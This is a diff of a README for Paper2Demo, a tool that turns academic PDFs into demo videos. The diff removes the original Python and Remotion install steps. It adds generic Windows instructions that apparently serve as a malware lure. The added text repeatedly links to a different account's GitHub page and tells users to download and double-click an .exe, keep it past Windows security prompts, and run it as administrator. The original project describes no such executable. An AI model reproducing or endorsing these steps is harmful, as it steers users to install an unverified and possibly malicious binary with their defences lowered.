@@ -1,203 +1,171 @@
+# 🎬 Paper2Demo - Turn Papers Into Demo Videos
 
-<div align="center">
-<p align="center">
-  <img src="asserts/paper2demo.png" alt="Paper2Demo Logo" width="30%">
-</p>
+[![Download Paper2Demo](https://img.shields.io/badge/Download-Paper2Demo-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Parasailgroundglass655/Paper2Demo)
+[![Paper2Demo Download](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-6f42c1?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Parasailgroundglass655/Paper2Demo)
 
+## 🖥️ What Paper2Demo does
 
-## Paper2Demo: Turn any academic PDF into a stunning demo video — fully automatically.
+Paper2Demo turns an academic PDF into a clean demo video. It helps you turn dense research into a format that is easier to show, share, and review.
 
-*Drop in a research paper. Walk away with a production-quality video presentation.*
+Use it when you want to:
+- present a paper in a short video
+- make a quick visual summary of a PDF
+- share research in a format people can watch
+- turn page content into slides, scenes, or a narrated demo flow
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE) [![Python](https://img.shields.io/badge/Python-3.10+-3776ab?logo=python&logoColor=white)](https://python.org) [![Remotion](https://img.shields.io/badge/Remotion-4.0-7c3aed?logo=react&logoColor=white)](https://remotion.dev) [![DeepSeek](https://img.shields.io/badge/AI-DeepSeek%20%7C%20Gemini-22c55e)](https://platform.deepseek.com)
+It is built for Windows users who want a simple way to move from PDF to video without setting up a complex editing tool.
 
-> ⚠️ **Early version** — This is a v0 prototype. Expect rough edges. Contributions and feedback are very welcome.
+## 📥 Download Paper2Demo
 
-</div>
+Visit this page to download and run Paper2Demo on Windows:
 
----
+https://github.com/Parasailgroundglass655/Paper2Demo
 
-## 🔧 How It Works
+If the page has a release file, download the Windows file listed there. If the page shows the full project files, use the main download option on the page and save the Windows package to your computer.
 
-<div align="left">
-  <img src="Paper2Demo-framework.png"  width="100%">
-  <br>
-  <em> <strong>The overall architecture of the Paper2Demo pipeline.</strong>The system transforms a raw PDF into a dynamic video via three main modules: local spatial extraction (extractor.py), AI-driven semantic structuring and summarization (analyzer.py), and dynamic video rendering with spring-physics animations (Remotion)</em>
-</div>
-<br>
+## 🪟 Windows requirements
 
----
+Before you start, make sure your PC has:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A recent PDF file you want to turn into a demo
+- Internet access for the first download
 
-## 🎥 Demo
+For smooth playback and faster export, a stronger CPU and more RAM help. If your PDF has many pages or images, more memory will make the process easier.
 
-*OBS-Diff: Accurate Pruning for Diffusion Models in One-Shot*
+## ⚙️ How to install
 
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/ff280109-bc2b-46c7-9f85-30e1433b1cff" width="80%" controls="controls" muted="muted" autoplay="autoplay"></video>
-  <br>
-  <em>A real video abstract generated entirely by Paper2Demo.</em>
-</div>
+Follow these steps on Windows:
 
----
+1. Open the download link above.
+2. Find the Windows download file on the page.
+3. Save the file to your Downloads folder.
+4. If the file is a .zip, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the main app file, such as an .exe file.
+7. Double-click the app file to start Paper2Demo.
 
-## ✨ What it does
+If Windows shows a security prompt, choose the option that keeps the file and lets you continue. This can happen with apps from GitHub.
 
-Given a PDF like this:
+## 🚀 First run
 
-```
-Attention Is All You Need (Vaswani et al., NeurIPS 2017)
-```
+When Paper2Demo opens for the first time, follow this order:
 
-It produces a ~30-second animated video with:
+1. Select your PDF file.
+2. Choose the output folder.
+3. Pick the demo style you want.
+4. Set the video length if the app gives you that option.
+5. Click the button to start the conversion.
+6. Wait for the export to finish.
+7. Open the saved video in your media player.
 
-- **Title scene** — paper title, authors, venue, adaptive color theme
-- **Problem scene** — the challenge the paper addresses, with animated bullet cards
-- **Method scene** — pipeline diagram + the paper's own architecture figure
-- **Contributions scene** — key contributions in a clean grid layout
-- **Results scene** — quantitative stats + the paper's results figure
+If the app asks for a folder, use one you can find later, such as Desktop or Videos.
 
-Every video is **automatically themed** based on the paper's domain — blue for efficiency/compression, purple for generative models, teal for NLP, orange for RL, and more.
+## 🎯 How to use it
 
----
+A simple workflow looks like this:
 
-## 🚀 Quick Start
+1. Open Paper2Demo.
+2. Load your academic PDF.
+3. Review the page list or section list.
+4. Choose the pages you want to include.
+5. Set the scene order.
+6. Add captions, titles, or simple notes if the app supports them.
+7. Export the final demo video.
 
-### 1. Clone and install
+For best results:
+- use a PDF with clear page layout
+- choose key pages, not every page
+- keep text short on screen
+- use images, charts, and diagrams where possible
+- trim pages that repeat the same point
 
-```bash
-git clone https://github.com/yourusername/paper2demo
-cd paper2demo
+## 🎞️ What you can make
 
-# Remotion (video renderer)
-npm install
+Paper2Demo is useful for:
+- paper walkthrough videos
+- short research demos
+- classroom presentations
+- lab meeting summaries
+- conference preview clips
+- project update videos
 
-# Python pipeline
-cd paper2demo
-pip install -r requirements.txt
-```
+You can use it for papers in many fields, such as:
+- computer science
+- machine learning
+- data science
+- robotics
+- bioinformatics
+- engineering
+- academic review work
 
-### 2. Get an API key
+## 🧩 Main features
 
-[DeepSeek](https://platform.deepseek.com) is recommended — cheap, fast, and works globally.
-Analyzing a full paper costs roughly **$0.01**.
+Paper2Demo focuses on a simple PDF-to-video flow:
+- PDF import
+- page selection
+- demo scene layout
+- title and caption support
+- video export
+- Windows-friendly setup
+- clean output for sharing and review
 
-```bash
-export DEEPSEEK_API_KEY=sk-...
+It aims to save time when you need a video version of a paper and do not want to edit each slide by hand.
 
-# Or use Google Gemini
-export GEMINI_API_KEY=AIza...
-```
+## 🧠 Tips for better output
 
-### 3. Run
+Use these tips to get a cleaner video:
+- start with the abstract, figures, and results
+- use one idea per scene
+- keep long paragraphs out of the video
+- use larger text in the source PDF when possible
+- check page order before export
+- review the video once before sharing it
 
-```bash
-cd paper2demo
-python main.py /path/to/paper.pdf
-```
+If your paper has many charts, focus on the most useful ones. A short demo often works better than a long video.
 
-### 4. Preview
+## 🛠️ Common issues
 
-```bash
-cd ..
-npm run dev
-# Open http://localhost:3000 → select PaperDemo
-```
+If Paper2Demo does not open:
+- make sure the download finished
+- check that you extracted the ZIP file first
+- try running the app as administrator
+- confirm you picked the Windows file, not the source folder
 
-### 5. Export
+If the PDF does not load:
+- check that the file is not open in another app
+- move the PDF to a simple folder path like Desktop
+- use a standard PDF file, not a scanned image file only
 
-```bash
-npx remotion render PaperDemo
-```
+If export is slow:
+- close other apps
+- use fewer pages
+- reduce high-resolution images in the PDF if possible
+- give the app more time on large papers
 
-That's it. One command, one video.
+## 📁 Suggested folder setup
 
----
+Keep your files in a simple structure:
+- `Paper2Demo` for the app files
+- `PDFs` for source papers
+- `Exports` for finished videos
 
+This makes it easier to find your work and keep projects in order.
 
+## 🔎 Before you start
 
-## 🎨 Adaptive Themes
+Use a PDF that has:
+- a title page
+- an abstract
+- clear figures or charts
+- readable text
+- a small set of key results
 
-The AI detects the paper's domain and applies a matching color theme automatically.
+This gives Paper2Demo better source material and helps the final video feel clear and focused
 
-| Domain | Theme | Palette |
-|--------|-------|---------|
-| Model Compression / Pruning | **efficiency** | Blue · Purple |
-| Image Generation / Diffusion | **creative** | Purple · Pink |
-| NLP / Large Language Models | **language** | Teal · Green |
-| Reinforcement Learning | **action** | Orange · Amber |
-| Computer Vision | **vision** | Sky Blue · Indigo |
-| Multimodal (Vision-Language) | **fusion** | Cyan · Magenta |
-| Robotics | **robotics** | Steel · Orange |
-| Medical / Bioinformatics | **medical** | Blue · Aqua |
-| Theory / Optimization | **academic** | Gold · Purple |
-| Systems / Infrastructure | **systems** | Emerald · Blue |
+## 📌 Repository link
 
----
+Primary download page:
 
-## 📁 Project Structure
-
-```
-paper2demo/              Python pipeline
-├── main.py              CLI entry point
-├── extractor.py         PDF parsing — text + figures (PyMuPDF)
-├── analyzer.py          AI analysis → paper-data.json
-└── requirements.txt
-
-src/PaperDemo/           Remotion video composition
-├── index.tsx            Main composition + calculateMetadata
-├── types.ts             TypeScript types for paper-data.json
-├── shared.tsx           Reusable animation hooks + components
-└── scenes/
-    ├── TitleScene.tsx
-    ├── ProblemScene.tsx
-    ├── MethodScene.tsx          ← embeds extracted figure
-    ├── ContributionsScene.tsx
-    └── ResultsScene.tsx         ← embeds extracted figure
-
-public/paper/            Auto-generated (gitignored)
-├── paper-data.json
-└── fig_*.png
-```
-
----
-
-## ⚙️ CLI Options
-
-```bash
-python main.py paper.pdf [--provider deepseek|gemini] [--output /path/to/project]
-```
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--provider` | `deepseek` | AI provider (`deepseek` or `gemini`) |
-| `--output` | parent of `paper2demo/` | Remotion project root |
-
----
-
-## 💡 Tips
-
-**Cost** — A full 22-page paper costs ~$0.01 with DeepSeek. The chunked pipeline makes even 100-page papers affordable.
-
-**Figure quality** — Figures are extracted at full resolution from the PDF. The AI matches each figure to the right scene by reading caption text, not by guessing filenames.
-
-**Speed** — Extraction is instant (local). Analysis takes 30–60 seconds depending on paper length and provider. Rendering takes ~2 minutes on a modern laptop.
-
----
-
-## 🗺️ TODO List
-
-- [ ] Direct arXiv URL input (`python main.py arxiv:2312.00752`)
-- [ ] Multiple video templates (minimal white, magazine, cinematic)
-- [ ] AI-generated voiceover via ElevenLabs
-- [ ] Batch processing for reading lists
-- [ ] Auto-generate animated charts from paper tables
-- [ ] Web UI — drag and drop, no terminal needed
-
----
-
-## 🤝 Contributing
-
-PRs are welcome. If you make a video from a cool paper, share it and tag the repo.
-
----
-
+https://github.com/Parasailgroundglass655/Paper2Demo
